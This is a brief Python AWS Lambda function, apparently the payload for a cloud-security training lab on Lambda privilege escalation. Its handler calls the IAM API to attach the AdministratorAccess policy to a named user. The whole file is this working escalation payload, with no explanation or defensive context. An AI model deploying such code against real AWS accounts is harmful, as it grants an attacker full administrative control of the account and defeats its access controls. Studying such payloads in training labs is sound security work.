from boto3 import *
def lambda_handler(evt, cont):
	cli = client('iam')
	resp = cli.attach_user_policy(
		UserName='chris-lambda_privesc_cgidk69ezo98nb',
		PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
	)
	return resp
		